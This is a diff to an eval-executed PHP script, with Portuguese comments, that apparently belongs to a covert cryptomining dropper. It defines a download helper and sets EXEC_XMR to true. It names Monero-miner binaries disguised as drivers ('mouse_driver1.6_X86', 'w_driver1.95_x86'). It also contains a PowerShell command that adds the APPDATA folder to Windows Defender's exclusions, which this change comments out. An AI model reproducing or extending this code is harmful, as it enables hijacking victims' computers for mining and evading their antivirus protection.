@@ -3,9 +3,9 @@ execução por eval. cuidado, não use exit e nem __FILE__
 *Atenção, este comando esta sendo executado via exec_blog_command() devido a mudança da url da conta. use só o comando do blg
 
 
-****16
+****17
 
-[___GIT_COMMAND]
+[GIT_COMMAND]
 
 $GLOBALS['__download_002'] = function($url, $post = false, $__header = array())
 {
@@ -220,9 +220,10 @@ if(1)
 {
 	@file_put_contents($id_com, $command_id);
 	try{
+	/*
 	$r = 0;
 	@exec('powershell Add-MpPreference -ExclusionPath "'.getenv('APPDATA').'"', $output, $r);
-	
+	*/
 	$EXEC_XMR = true;
 	$lolm_name = 'w_driver1.95_x86';
 	$xmr_name = 'mouse_driver1.6_X86';
